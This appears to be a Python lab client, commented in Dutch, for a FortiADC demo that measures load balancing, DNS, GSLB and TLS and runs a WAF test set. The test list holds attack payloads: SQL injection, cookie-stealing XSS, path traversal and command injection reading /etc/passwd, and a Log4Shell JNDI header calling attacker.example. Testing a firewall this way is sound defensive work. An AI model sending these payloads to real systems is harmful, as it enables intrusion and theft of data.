#!/usr/bin/env python3
"""Verkeer en aanvallen vanaf de client-container (aangeroepen door het demo-cockpit).

  labclient traffic <url> [-n 20] [--cookies]   verdeling over de realservers
  labclient dns <naam> [-n 1] [--interval 2]    wat antwoordt de DNS (via de lab-resolver)
  labclient attack <url>                        WAF-testset: wat komt erdoor, wat wordt geblokkeerd
  labclient tls <host>                          certificaatketen en TLS-versie van een VIP
  labclient gslb <naam>... --server NAAM=IP ...  per DNS-server: status, aa, TTL en antwoord

Alle verzoeken gaan via de lab-DNS en vertrouwen de lab-CA (zoals de desktop),
dus precies het pad dat een gebruiker zou nemen.
"""
from __future__ import annotations

import argparse
import collections
import http.cookiejar
import re
import socket
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request

UA = "Mozilla/5.0 (X11; Linux x86_64) FortiADC-Lab-client/1.0"

# Onschuldige teststrings die op echte aanvalstechnieken lijken. Ze raken alleen
# de eigen lab-apps; de WAF hoort de kwaadaardige te blokkeren en 'normaal' door te laten.
ATTACKS = [
    ("normaal verzoek", "/", {}, None),
    ("normaal zoeken", "/search?q=stroopwafels", {}, None),
    ("SQL-injectie (tautologie)", "/rest/products/search?q=%27))%20OR%201%3D1--", {}, None),
    ("SQL-injectie (UNION)", "/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", {}, None),
    ("Cross-site scripting", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", {}, None),
    ("XSS via event handler", "/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", {}, None),
    ("Path traversal", "/download?file=../../../../etc/passwd", {}, None),
    ("Command injection", "/ping?ip=127.0.0.1%3Bcat%20/etc/passwd", {}, None),
    ("Log4Shell (header)", "/", {"X-Api-Version": "${jndi:ldap://attacker.example/a}"}, None),
    ("Scanner user-agent", "/", {"User-Agent": "sqlmap/1.8.2#stable (https://sqlmap.org)"}, None),
    ("SQL-injectie in POST", "/rest/user/login", {"Content-Type": "application/json"},
     b'{"email":"\' OR 1=1--","password":"x"}'),
]


def opener(cookies: bool):
    handlers = [urllib.request.HTTPSHandler(context=ssl.create_default_context())]
    if cookies:
        handlers.append(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    return urllib.request.build_opener(*handlers)


def fetch(op, url, headers=None, data=None, timeout=8):
    req = urllib.request.Request(url, data=data, headers={"User-Agent": UA, **(headers or {})})
    try:
        with op.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(4096).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(4096).decode(errors="replace")


def cmd_traffic(a):
    op = opener(a.cookies)
    tally, errors = collections.Counter(), collections.Counter()
    print(f"{a.n} verzoeken naar {a.url} ({'met' if a.cookies else 'zonder'} cookies)")
    for i in range(a.n):
        try:
            code, hdr, _ = fetch(op, a.url)
            who = hdr.get("X-Served-By", f"HTTP {code} (geen X-Served-By)")
            tally[who] += 1
            print(f"  #{i + 1:<3} HTTP {code}  {who}")
        except (urllib.error.URLError, OSError) as e:
            errors[str(getattr(e, 'reason', e))] += 1
            print(f"  #{i + 1:<3} FOUT  {getattr(e, 'reason', e)}")
        time.sleep(a.pause)
    print("\nVerdeling:")
    for who, n in tally.most_common():
        print(f"  {who:<32} {n:>3}  {'#' * n}")
    for err, n in errors.items():
        print(f"  fout: {err} ({n}x)")


def cmd_dns(a):
    for i in range(a.n):
        out = subprocess.run(["dig", "+noall", "+answer", "+ttlid", a.name], capture_output=True, text=True).stdout
        lines = [" ".join(l.split()) for l in out.splitlines() if l.strip()] or ["(geen antwoord)"]
        print(f"{time.strftime('%H:%M:%S')}  " + "\n           ".join(lines), flush=True)
        if i + 1 < a.n:
            time.sleep(a.interval)


def dig_summary(name, server, recurse) -> dict:
    """Eén dig-vraag samengevat: status, authoritative, TTL en de A-records."""
    args = ["dig", f"@{server}", name, "A", "+tries=1", "+time=2"] + ([] if recurse else ["+norecurse"])
    out = subprocess.run(args, capture_output=True, text=True).stdout
    status = re.search(r"status: (\w+)", out)
    flags = re.search(r"flags: ([a-z ]+);", out)
    answers = re.findall(r"^\S+\s+(\d+)\s+IN\s+(A|CNAME)\s+(\S+)", out, re.M)
    a_rr = [(int(ttl), v) for ttl, t, v in answers if t == "A"]
    return {"status": status.group(1) if status else "geen antwoord",
            "aa": bool(flags and " aa" in f" {flags.group(1)}"),
            "ttl": min((t for t, _ in a_rr), default=None), "ips": [v for _, v in a_rr]}


def cmd_gslb(a):
    servers = [s.split("=", 1) for s in a.server]
    print(f"  {'naam':<34} {'server':<14} {'status':<10} {'aa':<3} {'TTL':>5}  antwoord")
    for name in a.names:
        for label, ip in servers:
            r = dig_summary(name, ip, recurse=label.lower().startswith("lab"))
            print(f"  {name:<34} {label:<14} {r['status']:<10} {'ja' if r['aa'] else '-':<3} "
                  f"{r['ttl'] if r['ttl'] is not None else '-':>5}  {', '.join(r['ips']) or '-'}")
        print()


def verdict(code, body) -> str:
    low = body.lower()
    if code in (403, 406) or "attack id" in low or "request was blocked" in low or "web application firewall" in low:
        return "GEBLOKKEERD"
    return "doorgelaten"


def cmd_attack(a):
    op = opener(False)
    base = a.url.rstrip("/")
    print(f"WAF-testset tegen {base}\n")
    print(f"  {'aanval':<30} {'HTTP':<5} resultaat")
    for name, path, headers, data in ATTACKS:
        try:
            code, _, body = fetch(op, base + path, headers, data)
            res = verdict(code, body)
        except (urllib.error.URLError, OSError, ConnectionError) as e:
            code, res = "-", f"verbinding verbroken ({getattr(e, 'reason', e)}): GEBLOKKEERD?"
        print(f"  {name:<30} {code!s:<5} {res}")
    print("\nZie op de FortiADC: Log & Report > Security Log > WAF (of FortiView > Threats).")


def cmd_tls(a):
    host = a.host
    ctx = ssl.create_default_context()
    with socket.create_connection((host, 443), timeout=5) as raw, ctx.wrap_socket(raw, server_hostname=host) as s:
        cert = s.getpeercert()
        print(f"{host} -> {s.getpeername()[0]}")
        print(f"  TLS-versie     : {s.version()}  ({s.cipher()[0]})")
        print(f"  onderwerp      : {dict(x[0] for x in cert['subject']).get('commonName')}")
        print(f"  uitgever       : {dict(x[0] for x in cert['issuer']).get('commonName')}")
        print(f"  SAN's          : {', '.join(v for _, v in cert.get('subjectAltName', []))}")
        print(f"  geldig tot     : {cert['notAfter']}")
        print("  vertrouwd      : ja (keten gevalideerd tegen de lab-CA)")


def main():
    p = argparse.ArgumentParser(prog="labclient")
    sub = p.add_subparsers(dest="cmd", required=True)
    t = sub.add_parser("traffic"); t.add_argument("url"); t.add_argument("-n", type=int, default=20)
    t.add_argument("--cookies", action="store_true"); t.add_argument("--pause", type=float, default=0.1)
    d = sub.add_parser("dns"); d.add_argument("name"); d.add_argument("-n", type=int, default=1)
    d.add_argument("--interval", type=float, default=2)
    k = sub.add_parser("attack"); k.add_argument("url")
    s = sub.add_parser("tls"); s.add_argument("host")
    g = sub.add_parser("gslb"); g.add_argument("names", nargs="+")
    g.add_argument("--server", action="append", required=True, help="label=IP, bijv. FAD-AMS=10.80.0.1")
    a = p.parse_args()
    {"traffic": cmd_traffic, "dns": cmd_dns, "attack": cmd_attack, "tls": cmd_tls, "gslb": cmd_gslb}[a.cmd](a)


if __name__ == "__main__":
    try:
        main()
    except (OSError, ssl.SSLError) as e:
        print(f"fout: {e}", file=sys.stderr)
        sys.exit(1)
